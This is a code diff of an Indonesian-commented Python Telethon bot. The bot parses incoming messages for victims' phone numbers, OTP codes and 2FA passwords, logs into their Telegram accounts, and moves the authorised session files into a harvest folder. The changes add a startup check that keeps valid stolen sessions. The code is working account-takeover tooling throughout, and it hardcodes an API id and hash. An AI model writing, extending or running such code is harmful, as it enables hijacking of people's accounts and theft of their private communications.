@@ -1,4 +1,3 @@
-
 import asyncio
 import os
 import re
@@ -13,8 +12,8 @@ from telethon.tl.functions.account import GetAuthorizationsRequest
 api_id = 23520639
 api_hash = 'bcbc7a22cde8fa2ba7d1baad086086ca'
 
-SESSIONS_FOLDER = "a44_sessions"
-SESSIONS_FOLDER_FINAL = "sessions2"
+SESSIONS_FOLDER = "a45_sessions"
+SESSIONS_FOLDER_FINAL = "sessions3"
 ALLOWED_PREFIXES = ["+62", "+60", "+971"]
 
 pending_login = {}
@@ -140,15 +139,6 @@ async def request_otp(phone):
     except Exception as e:
         print(f"[ERROR] Terjadi kesalahan saat request OTP untuk {phone}: {e}")
 
-# Tangani OTP yang datang lebih awal
-async def handle_early_otp(phone, otp, password=None):
-    await request_otp(phone)
-    await asyncio.sleep(3)
-    if phone in pending_login:
-        await complete_login(phone, otp, password)
-    else:
-        print(f"[❌] Gagal proses login untuk {phone} setelah OTP masuk duluan.")
-
 # Login jika OTP diterima
 async def complete_login(phone, otp, password=None):
     try:
@@ -192,9 +182,11 @@ async def complete_login(phone, otp, password=None):
             return
 
         print(f"[✅] Login berhasil untuk {phone}")
-        await login_client.disconnect()
-        await asyncio.sleep(1)
 
+        await login_client.disconnect()
+        await asyncio.sleep(1)  # Tambahkan delay sebelum pindahkan session
+
+        # Coba pindahkan dengan retry jika masih terkunci
         src = os.path.join(SESSIONS_FOLDER, phone + ".session")
         dst = os.path.join(SESSIONS_FOLDER_FINAL, phone + ".session")
 
@@ -217,7 +209,35 @@ async def complete_login(phone, otp, password=None):
         if phone in pending_login:
             del pending_login[phone]
 
-# Event handler
+
+    except Exception as e:
+        print(f"[❌] Error saat login {phone}: {e}")
+        if phone in pending_login:
+            del pending_login[phone]
+
+# Cek semua session lama saat startup
+async def check_all_existing_sessions():
+    print("\n[🔍] Memeriksa session lama...\n")
+    for filename in os.listdir(SESSIONS_FOLDER):
+        if filename.endswith(".session"):
+            phone = filename.replace(".session", "")
+            session_path = os.path.join(SESSIONS_FOLDER, phone)
+            client = TelegramClient(session_path, api_id, api_hash)
+            try:
+                await client.connect()
+                if await client.is_user_authorized():
+                    print(f"[✅] Session valid: {phone}")
+                    await client.disconnect()
+
+                    final_path = os.path.join(SESSIONS_FOLDER_FINAL, phone)
+                    shutil.move(session_path + ".session", final_path + ".session")
+                else:
+                    print(f"[❌] Session tidak valid: {phone}")
+                    await client.disconnect()
+            except Exception as e:
+                print(f"[ERROR] Gagal buka session {phone}: {e}")
+
+# Event handler pesan masuk
 @client.on(events.NewMessage)
 async def handler(event):
     msg = event.raw_text
@@ -243,19 +263,16 @@ async def handler(event):
                 print(f"[❌] Nomor tidak valid: {raw_phone}")
                 return
 
-            password = password_match.group(1) if password_match else None
-
             if otp_match:
                 otp = otp_match.group(1)
+                password = password_match.group(1) if password_match else None
                 print(f"[📥] OTP diterima untuk {phone}: {otp}")
                 if password:
                     print(f"[🔐] Password 2FA: {password}")
-
                 if phone in pending_login:
                     asyncio.create_task(complete_login(phone, otp, password))
                 else:
-                    print(f"[⚠️] OTP diterima duluan untuk {phone}, tetap akan request OTP lalu login...")
-                    asyncio.create_task(handle_early_otp(phone, otp, password))
+                    print(f"[⚠️] OTP diterima tapi belum ada request OTP untuk {phone}")
             else:
                 if phone not in pending_login:
                     print(f"[📨] Mengirim OTP ke {phone}")
@@ -265,6 +282,7 @@ async def handler(event):
 
 # Main
 async def main():
+    await check_all_existing_sessions()
     await client.start()
     print("[🚀] Bot Telegram siap berjalan.")
     await client.run_until_disconnected()
